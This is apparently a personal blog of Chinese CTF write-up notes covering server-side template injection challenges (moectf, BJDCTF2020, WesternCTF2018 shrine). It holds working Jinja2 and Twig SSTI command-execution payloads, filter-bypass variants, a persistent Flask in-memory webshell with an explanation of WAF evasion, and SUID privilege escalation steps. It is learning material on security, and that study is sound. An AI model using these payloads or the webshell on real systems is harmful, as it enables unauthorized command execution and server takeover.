<h3 id="3-上下文逃逸"><a href="#3-上下文逃逸" class="headerlink" title="3. 上下文逃逸"></a>3. 上下文逃逸</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set cmd = &#x27;id&#x27; %&#125;</span><br><span class="line">&#123;&#123;&#123;cmd:[&#x27;system&#x27;]&#125;|json_encode&#125;&#125;  &lt;!-- 利用JSON解析漏洞 --&gt;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="moectf-web-20-第二十章-幽冥血海·幻语心魔"><a href="#moectf-web-20-第二十章-幽冥血海·幻语心魔" class="headerlink" title="moectf web 20 第二十章 幽冥血海·幻语心魔"></a>moectf web 20 第二十章 幽冥血海·幻语心魔</h2><p>怎么判断是不是ssti？</p>
<p>输入{{7*7}}，他甚至会帮你计算</p>
<p>举例：因为Jinja2 在渲染的时候会把<code>{{}}</code>包裹的内容当做变量解析替换，所以当我们传入 <code>{{表达式}}</code> 时，表达式就会被渲染器执行。</p>
<p>方法一：url拼接</p>
<p>通用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;env&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;&#123; lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;env&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;&#123; request.application.__globals__[&quot;__builtins__&quot;][&quot;__import__&quot;](&quot;os&quot;).popen(&quot;env&quot;).read() &#125;&#125;</span><br><span class="line">&#123;% print(url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;env&#x27;).read()&quot;))%&#125;</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;env&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">&#123;&#123;self.__init__.__globals__.__builtins__.open(&#x27;/flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>



<p>方法二：fenjing梭哈</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1:42803/?password=iwantflag%E4%B8%BA%E4%BB%80%E4%B9%88%E6%98%AF%E8%BF%99%E4%B8%AA">http://127.0.0.1:42803/?password=iwantflag为什么是这个</a></p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1:50032/?username=1&password=1">http://127.0.0.1:50032/?username=1&amp;password=1</a> 这个才是原格式</p>
<p>为什么不按照原格式来呢</p>
<table>
<thead>
<tr>
<th>URL 类型</th>
<th>作用</th>
<th>核心特点</th>
</tr>
</thead>
<tbody><tr>
<td>原格式 <code>50032/?username=1&amp;password=1</code></td>
<td>正常访问漏洞页面的 “示例”</td>
<td><code>username</code>&#x2F;<code>password</code>都是 “固定值”，无注入</td>
</tr>
<tr>
<td>利用格式 <code>42803/?password=iwantflag</code></td>
<td>漏洞利用的 “基础 URL”</td>
<td>仅保留必填的<code>password</code>固定值，留<code>username</code>作为注入位</td>
</tr>
</tbody></table>
<h3 id="因为username-要留作-“注入位”，不能写死为1"><a href="#因为username-要留作-“注入位”，不能写死为1" class="headerlink" title="因为username 要留作 “注入位”，不能写死为1"></a>因为<code>username</code> 要留作 “注入位”，不能写死为<code>1</code></h3><p>原始格式的 <code>username=1</code> 是 “固定值”，但漏洞利用的核心是<strong>把<code>username</code>的值换成 SSTI Payload</strong>：</p>
<ul>
<li><p>如果照搬原始格式写成 <code>?username=1&amp;password=iwantflag</code>，<code>username</code> 被固定为<code>1</code>，无法注入 Payload；</p>
</li>
<li><p>所以只保留 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=iwantflag</span><br></pre></td></tr></table></figure>

<p>得</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:42803/?password=iwantflag&amp;username=恶意Payload</span><br></pre></td></tr></table></figure>

<p>passwd和usern位置反了？</p>
<p>“passwd 和 username 位置反了” 其实<strong>完全不影响漏洞利用</strong>——URL 参数的核心是「键值对存在且值正确」，而非「参数的先后顺序」</p>
<p>参考前面介绍里面的图，可以发现顺序不重要。</p>
<p>具体fenjing使用页面：图片删了</p>
</li>
</ul>
<h2 id="21-第二十一章-往生漩涡·言灵死局"><a href="#21-第二十一章-往生漩涡·言灵死局" class="headerlink" title="21 第二十一章 往生漩涡·言灵死局"></a>21 第二十一章 往生漩涡·言灵死局</h2><p>输入{{7*7}}提示错误，知道被绕过</p>
<p>以此类推发现__和globals也被绕过</p>
<ol>
<li><p><code>{{</code>  <code>}}</code>  -&gt;   <code>{% print() %}</code> </p>
</li>
<li><p><code>__</code> 和 <code>globals</code>  -&gt;<code> &#39;_&#39;&#39;_&#39;&#39;glo&#39;&#39;bals&#39;&#39;_&#39;&#39;_&#39;</code></p>
</li>
<li><p>关于点访问和数组访问</p>
<table>
<thead>
<tr>
<th>写法 1（点访问）</th>
<th>写法 2（数组访问）</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td><code>lipsum.__globals__</code></td>
<td><code>lipsum[&#39;__globals__&#39;]</code></td>
<td></td>
</tr>
</tbody></table>
</li>
</ol>
<p>方法一:</p>
<p>原：</p>
<p><code>{{ lipsum.__globals__[&#39;os&#39;].popen(&#39;env&#39;).read() }}</code></p>
<p>现：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% print(lipsum[&#x27;_&#x27;&#x27;_glo&#x27;&#x27;bals_&#x27;&#x27;_&#x27;][&#x27;os&#x27;].popen(&#x27;env&#x27;).read()) %&#125;</span><br><span class="line">&#123;% print(lipsum[&#x27;_&#x27;&#x27;_&#x27;&#x27;glo&#x27;&#x27;bals&#x27;&#x27;_&#x27;&#x27;_&#x27;][&#x27;os&#x27;].popen(&#x27;env&#x27;).read()) %&#125;</span><br></pre></td></tr></table></figure>









<p>方法二：fejing</p>
<p>使用指南：</p>
<p>进入env文件夹后打开终端，输入：</p>
<p>激活命令：</p>
<p>&amp; “.\Scripts\Activate.ps1”</p>
<p>启动网页命令：</p>
<p>python -m fenjing webui</p>
<p>网页参数填写：</p>
<p>原：<a target="_blank" rel="noopener" href="http://127.0.0.1:2775/?username=1&password=1">http://127.0.0.1:2775/?username=1&amp;password=1</a></p>
<p>输入url<a target="_blank" rel="noopener" href="http://127.0.0.1:2775/?password=1">http://127.0.0.1:2775/?password=1</a></p>
<p>请求方式：get</p>
<p>表单输入：username</p>
<p>分析模式：快速</p>
<p>指令：cat &#x2F;flag</p>
<h2 id="moectf-web-22-第二十二章-血海核心·千年手段"><a href="#moectf-web-22-第二十二章-血海核心·千年手段" class="headerlink" title="moectf web 22 第二十二章 血海核心·千年手段"></a>moectf web 22 第二十二章 血海核心·千年手段</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())\&quot;)==None else resp)&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;sys&#x27;].modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>





<p>知识点：</p>
<p>1.Flask ：</p>
<p>是 Python 的<strong>轻量级 Web 框架</strong>，核心作用是：帮你用几行 Python 代码，快速搭一个能通过浏览器访问的网站（服务器）。</p>
<p>1.1Flask 的一个核心特点：<strong>每次收到用户请求，都会按顺序执行 “钩子函数”+ 视图函数</strong>（比如<code>before_request</code>就是 “请求来之前先执行的函数”）。</p>
<p>2.内存马：</p>
<p>内存马 &#x3D; <strong>只存在于 服务器运行内存中 的后门</strong>（没有文件落地，而且服务器重启就会消失），核心是「偷偷给 Web 程序加一个 “隐藏功能”，只有你知道怎么触发」。</p>
<p>用生活例子类比：</p>
<ul>
<li>正常情况：你去奶茶店（服务器），只能点菜单上的饮品（正常功能）；</li>
<li>内存马：你偷偷和奶茶店员工（Web 程序）说 “以后我来只要说暗号‘QwQ’，你就帮我拿后厨的可乐（执行命令）”—— 这个 “暗号→拿可乐” 的规则，只存在员工脑子里（内存），没有写在菜单上（无文件），只有你知道，其他人不会发现。</li>
</ul>
<h3 id="1-2：核心：WAF-只认-“直接干坏事”-的请求，不认-“偷偷埋雷-后期触发”-的操作"><a href="#1-2：核心：WAF-只认-“直接干坏事”-的请求，不认-“偷偷埋雷-后期触发”-的操作" class="headerlink" title="1+2：核心：WAF 只认 “直接干坏事” 的请求，不认 “偷偷埋雷 + 后期触发” 的操作"></a>1+2：核心：WAF 只认 “直接干坏事” 的请求，不认 “偷偷埋雷 + 后期触发” 的操作</h3><ol>
<li><strong>直接执行命令（被拦）</strong>：</li>
</ol>
<p>你直接跟服务器说 “帮我执行 cat &#x2F;flag”，WAF 一眼就看出来你要干坏事，直接把你拦住，服务器根本收不到你的请求。</p>
<ol start="2">
<li><strong>内存马（不被拦）</strong>：</li>
</ol>
<ul>
<li>第一步（埋雷）：你跟服务器说 “以后只要我传参数 a，你就执行 a 里的内容”—— 这话听起来就是 “设置一个规则”，没有直接说要读 flag，WAF 觉得你只是正常配置，服务器记住了这个规则（雷埋好了）；</li>
<li>第二步（踩雷）：你再跟服务器说 “a&#x3D;cat &#x2F;flag”—— 这话看起来就是 “传一个普通参数 a，值是 cat &#x2F;flag”，WAF 只看到你传了个参数，不知道服务器早就记了 “执行 a 里内容” 的规则，就又放行了；</li>
<li>结果：服务器收到 “a&#x3D;cat &#x2F;flag” 后，按之前埋的规则执行了命令，拿到 flag，但 WAF 全程没发现你在干坏事。</li>
</ul>
<p>3.内存马构造</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;sys.modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda: __import__(&#x27;os&#x27;).popen(__import__(&#x27;flask&#x27;).request.args.get(&#x27;a&#x27;)).read())&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>









<ul>
<li><p><code>url_for.__globals__</code>：Flask 内置函数<code>url_for</code>的全局变量空间（能拿到 Flask 的核心对象<code>app</code>）；</p>
</li>
<li><p><code>__builtins__[&#39;eval&#39;]</code>：Python 的内置执行函数（用来执行后面的字符串代码）；</p>
</li>
<li><p><code>app.before_request_funcs</code>：Flask 的 “请求前钩子”——<strong>每次收到 HTTP 请求，先执行这个钩子里的函数</strong>；</p>
</li>
<li><p>append(lambda: …)：往钩子里加一个匿名函数，逻辑是：</p>
<p>1.接收 GET 参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a</span><br></pre></td></tr></table></figure>

<p>（比如你传</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=whoami</span><br></pre></td></tr></table></figure>

<p>）；</p>
<p>2.执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.popen(参数a)</span><br></pre></td></tr></table></figure>

<p>（运行系统命令）；</p>
<p>3.读取命令执行结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read()</span><br></pre></td></tr></table></figure></li>
</ul>
<p>4.提权：“SUID 提权” </p>
<p>利用 setuid 位的<code>rev</code>程序</p>
<ol>
<li><p>SUID 位：临时拥有程序所有者（通常是 root）的权限</p>
</li>
<li><p>谁有suid位？找 SUID 程序</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>（遍历系统，找带 SUID 位的文件，忽略错误输出），只找到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/rev</span><br></pre></td></tr></table></figure>


</li>
<li><p>什么是rev？</p>
<p>rev 程序的特殊之处：</p>
<p>题目里说&#x2F;usr&#x2F;bin有 rev 的 C 源码（核心是 rev 被设置了 SUID，且源码里有漏洞 &#x2F; 特殊逻辑）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=cat /usr/bin/rev.c&amp;password=1</span><br></pre></td></tr></table></figure>



<p>源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">    // 遍历命令行参数（从第1个参数开始，跳过程序名argv[0]）</span><br><span class="line">    for (int i = 1; i + 1 &lt; argc; i++) &#123;</span><br><span class="line">        // 判断当前参数是否是定制的--HDdss</span><br><span class="line">        if (strcmp(&quot;--HDdss&quot;, argv[i]) == 0) &#123;</span><br><span class="line">            // 执行--HDdss后面的命令（核心：放弃反转字符串，执行外部命令）</span><br><span class="line">            execvp(argv[i + 1], &amp;argv[i + 1]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>execvp</code> 是 Linux&#x2F;Unix 系统下 C 语言的<strong>进程替换函数</strong></p>
<p>大白话讲：它的作用是「用一个新的命令 &#x2F; 程序，替换当前正在运行的程序进程（rev）</p>
</li>
<li><p>拿 flag</p>
<p>用内存马执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rev --HDdss cat /flag</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li><code>rev</code>以 root 权限运行（因为 SUID 位）；</li>
<li><code>--HDdss</code>是 rev 的特殊参数，让它执行后面的<code>cat /flag</code>（相当于用 root 权限读 &#x2F;flag）；</li>
<li><code>rev</code>本身是 “反转字符串” 的命令，但这里是题目定制的版本，加参数后能执行其他命令。</li>
</ul>
<p>5.rev反转字符串</p>
<p>普通用法下（比如<code>rev test.txt</code>），它还是会反转字符串；但只要加了<code>--HDdss</code>这个出题人自定义的参数，代码里的逻辑就会 “走岔路”—— 跳过反转字符串的代码块，执行 “执行外部命令” 的代码块。</p>
<p>1.构造内存马</p>
<p>2.注入内存马</p>
<p>3.传参a&#x3D;ls &#x2F;和whoami</p>
<p>输入：<a target="_blank" rel="noopener" href="http://127.0.0.1:10745/?a=ls%20/&password=1">http://127.0.0.1:10745/?a=ls%20/&amp;password=1</a></p>
<p>得到：flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app bin boot dev entrypoint.sh etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var </span><br></pre></td></tr></table></figure>





<p><img src="/images/image-20251224203920593.png" alt="image-20251224203920593"></p>
<p>为什么不传cat &#x2F;flag？因为whoami之后会发现你不是root，需要提权才能cat &#x2F;flag</p>
<p>4.找到能提权的指令，然后后面跟特殊定制版命令，最后加上cat &#x2F;flag</p>
<p>4.1找到rev</p>
<p>4.2rev.c查看源代码，发现有定制版rev</p>
<p>4.3输入：</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1:10745/?a=rev">http://127.0.0.1:10745/?a=rev</a> –HDdss cat &#x2F;flag&amp;password&#x3D;1</p>
<p><img src="/images/image-20251224203954397.png" alt="image-20251224203954397"></p>
<p><img src="/images/image-20251224204057314.png" alt="image-20251224204057314"></p>
<p>第一道由我自己找到思路的题目！！！！！！！！！</p>
<h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><h3 id="1-第一道由我自己找到思路的题目！！！！！！！！！结果发现思路不是很好。。。。"><a href="#1-第一道由我自己找到思路的题目！！！！！！！！！结果发现思路不是很好。。。。" class="headerlink" title="1 第一道由我自己找到思路的题目！！！！！！！！！结果发现思路不是很好。。。。"></a>1 第一道由我自己找到思路的题目！！！！！！！！！结果发现思路不是很好。。。。</h3><p>1.很正常的网站，进去之后后看了flag.php index.php的源码，并没有任何发现</p>
<p>唯一有的就是一个登陆页面，没有密码，只要输账号，然后我试了sql和万能密码，都没有用</p>
<p>于是想到每次输进去都会有显示：hello，xxx</p>
<p>好吧，我瞎了，看了题解发现</p>
<p><img src="/images/image-20251227115027878.png" alt="image-20251227115027878"></p>
<p>2.考虑ssti，输入{{7*7}}</p>
<p>发现惊喜！！！！！！！！</p>
<p><img src="/images/image-20251227135455493.png" alt="image-20251227135455493"></p>
<ol start="3">
<li></li>
</ol>
<p>输入{{ lipsum.<strong>globals</strong>[‘os’].popen(‘env’).read() }}发现没有显示了，想到可能被过滤掉了</p>
<p>于是一个一个试，轮到{{ lipsum.}}发现显示为：</p>
<h2 id="What-do-you-want-to-do"><a href="#What-do-you-want-to-do" class="headerlink" title="What do you want to do?!"></a>What do you want to do?!</h2><p>试了好几个，都是这样，发现都被过滤，换种思路？cookie？</p>
<p>4.cookie，题目有提示的</p>
<p>抓个包看看</p>
<p>![屏幕截图 2025-12-27 135344](&#x2F;images&#x2F;屏幕截图 2025-12-27 135344.png)</p>
<p><strong>Cookie</strong>: <strong>PHPSESSID</strong>&#x3D;<strong>380b3509ce71b831ed6a431a408cb503</strong>; <strong>user</strong>&#x3D;<strong>1</strong></p>
<p>谢天谢地，原来注入点在这里呜呜呜呜</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>











<h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>打开就是源码</p>
<figure class="highlight plaintext"><figcaption><span>flask</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">import flask</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"># [疑点 1: Flag 在哪？]</span><br><span class="line"># 从系统环境变量拿走 FLAG 存入 app 的 config 字典里。</span><br><span class="line"># 以后只能通过 app.config[&#x27;FLAG&#x27;] 访问，系统里已经没这个环境变量了。</span><br><span class="line">app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    # [疑点 2: 首页显示什么？]</span><br><span class="line">    # __file__ 指向当前这个 py 文件。访问首页就读取并显示这段源码。</span><br><span class="line">    # 所以你才能在网页上看到这些代码。</span><br><span class="line">    return open(__file__).read()</span><br><span class="line"></span><br><span class="line"># [疑点 3: 路由和变量怎么来的？]</span><br><span class="line"># &lt;path:shrine&gt; 就像个捕获器，URL 后面跟着什么，变量 shrine 就是什么。</span><br><span class="line">@app.route(&#x27;/shrine/&lt;path:shrine&gt;&#x27;)</span><br><span class="line">def shrine(shrine):</span><br><span class="line"></span><br><span class="line">    def safe_jinja(s):</span><br><span class="line">        # [疑点 4: 为什么要删括号？]</span><br><span class="line">        # 把 () 删掉是为了防止你通过 Python 语法调用函数，比如 .read()</span><br><span class="line">        s = s.replace(&#x27;(&#x27;, &#x27;&#x27;).replace(&#x27;)&#x27;, &#x27;&#x27;)</span><br><span class="line">        </span><br><span class="line">        # [疑点 5: config 和 self 哪里来的？]</span><br><span class="line">        # 这是程序员手动定义的“黑名单”列表，里面存了两个他想封杀的词。</span><br><span class="line">        blacklist = [&#x27;config&#x27;, &#x27;self&#x27;]</span><br><span class="line">        </span><br><span class="line">        # [疑点 6: 拼接是怎么实现的？]</span><br><span class="line">        # 这一行其实是：</span><br><span class="line">        # 1. 循环 blacklist 里的词。</span><br><span class="line">        # 2. 生成 &quot;&#123;&#123;% set config=None%&#125;&#125;&#123;&#123;% set self=None%&#125;&#125;&quot; 这样两句禁令。</span><br><span class="line">        # 3. 最后加上你输入的字符串 s (即参数 shrine)。</span><br><span class="line">        prefix = &#x27;&#x27;.join([&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;.format(c) for c in blacklist])</span><br><span class="line">        return prefix + s</span><br><span class="line"></span><br><span class="line">    # [疑点 7: 为什么能执行代码？]</span><br><span class="line">    # render_template_string 是核心，它会把字符串当成 Jinja2 模板执行。</span><br><span class="line">    # 它收到的内容是：[禁令] + [你输入的内容]。</span><br><span class="line">    # 因为禁令在前，如果你直接写 &#123;&#123;config&#125;&#125;，只会得到 None。</span><br><span class="line">    return flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(debug=True)</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">import flask</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"># [核心目标]：Flag 被存放在了 app 的 config 里面</span><br><span class="line">app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//os.environ：这是一个字典，里面存着你电脑/服务器上所有的“环境变量”（比如系统用户名、路径等）。</span><br><span class="line"></span><br><span class="line">//pop(&#x27;FLAG&#x27;)：这是字典的一个操作。它的意思是：把名字叫 FLAG 的那个值拿出来，并从环境变量里彻底删掉。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//@app.route(&#x27;/&#x27;) 是什么意思？</span><br><span class="line"></span><br><span class="line">    //在 Flask 里，这叫“路由装饰器”。</span><br><span class="line"></span><br><span class="line">    //它告诉服务器：“如果有用户访问网站的‘根目录’（即网站首页，/），就请执行下面那个名为 index() 的函数。”</span><br><span class="line"></span><br><span class="line">    //所以当你打开浏览器输入 http://127.0.0.1:5000/，你看到的内容就是 index() 函数返回的东西。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def index():							</span><br><span class="line">	//这是的函数就是上面路由需要执行的函数了</span><br><span class="line">	</span><br><span class="line">    # 访问根目录时，直接把这段代码读出来显示在网页上</span><br><span class="line">    return open(__file__).read()</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/shrine/&lt;path:shrine&gt;&#x27;)  //有人输入这个url就会执行下面的函数</span><br><span class="line"></span><br><span class="line">&lt;path:shrine&gt;：这是一个捕获器。它告诉 Flask，门牌号 /shrine/ 后面跟着的任何东西，都把它装进一个叫 shrine 的信封里，交给下面的函数处理。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def shrine(shrine):</span><br><span class="line">    def safe_jinja(s):</span><br><span class="line">        # [限制 1]：把括号 ( ) 替换为空，这意味着你不能调用任何函数（如 .read()）</span><br><span class="line">        s = s.replace(&#x27;(&#x27;, &#x27;&#x27;).replace(&#x27;)&#x27;, &#x27;&#x27;)</span><br><span class="line">        </span><br><span class="line">        # [限制 2]：黑名单，不准直接使用 config 和 self 这两个变量名</span><br><span class="line">        blacklist = [&#x27;config&#x27;, &#x27;self&#x27;]</span><br><span class="line">        </span><br><span class="line">        # [混淆操作]：在你的 Payload 前面强行加上 &#123;&#123;% set config=None %&#125;&#125;</span><br><span class="line">        # 这会导致你在模板里直接写 &#123;&#123; config &#125;&#125; 拿不到任何东西</span><br><span class="line">        prefix = &#x27;&#x27;.join([&#x27;&#123;&#123;% set &#123;&#125;=None %&#125;&#125;&#x27;.format(c) for c in blacklist])</span><br><span class="line">        </span><br><span class="line">        //1.&#x27; ... &#123;&#125; ... &#x27;.format(&#x27;config&#x27;) ：</span><br><span class="line">        Python 只盯着那一对孤零零的大括号 &#123;&#125;。它看到 .format(&#x27;config&#x27;)，就立刻把 &#x27;config&#x27; 塞进那个坑里。</span><br><span class="line">        //2.&#x27;&#x27;.join([...])里面的&#x27;&#x27;是啥意思：</span><br><span class="line">&#x27;&#x27;.join([&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;])		&quot;ABC&quot;	就像用无形胶水粘在一起</span><br><span class="line">&#x27;-&#x27;.join([&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;])		&quot;A-B-C&quot;	用横杠作为粘合剂</span><br><span class="line">&#x27; 和 &#x27;.join([&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;])		&quot;A 和 B 和 C&quot;	用文字作为粘合剂</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        return prefix + s</span><br><span class="line">        //进行拼接</span><br><span class="line"></span><br><span class="line">    # [漏洞点]：render_template_string 会解析并执行用户传入的字符串</span><br><span class="line">    return flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(debug=True)</span><br></pre></td></tr></table></figure>



<h3 id="为什么-current-app-config-还能用？"><a href="#为什么-current-app-config-还能用？" class="headerlink" title="为什么 current_app.config 还能用？"></a>为什么 <code>current_app.config</code> 还能用？</h3><p>在编程中，<code>config</code> 这个词出现在不同的地方，意义完全不同：</p>
<ul>
<li><p><strong>作为独立变量名：</strong> <code>{{ config }}</code> —— 这个被你代码里的 <code>set config=None</code> 废掉了。</p>
</li>
